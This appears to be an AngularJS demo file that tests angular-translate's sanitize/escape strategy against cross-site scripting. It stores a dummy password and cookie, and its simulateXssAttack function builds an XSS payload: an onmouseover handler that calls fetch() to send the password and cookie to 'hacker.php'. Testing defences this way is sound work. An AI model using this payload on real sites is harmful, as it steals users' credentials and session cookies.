var translations = {};

var app = angular.module('myApp_sanitize', [
  'pascalprecht.translate',
  'ngSanitize',
]);

app.config([
  '$translateProvider',
  function ($translateProvider) {
    $translateProvider.translations('en', translations);
    $translateProvider.preferredLanguage('en');

    $translateProvider.useSanitizeValueStrategy('escape'); // works regardless

    localStorage.setItem('password', 'super-secret-password');
    document.cookie =
      'cookieName=cookieValue; expires=Thu, 18 Dec 2024 12:00:00 UTC; path=/';
  },
]);

app.controller('Ctrl', [
  '$scope',
  function ($scope) {
    $scope.input = '';

    $scope.simulateXssAttack = function () {
      var str = `<div onmouseover="javascript:fetch('hacker.php?password=' + localStorage.getItem('password') + '&session=' + encodeURIComponent(document.cookie));">MOUSE OVER ME!</div>`;
      $scope.input = str;
    };
  },
]);
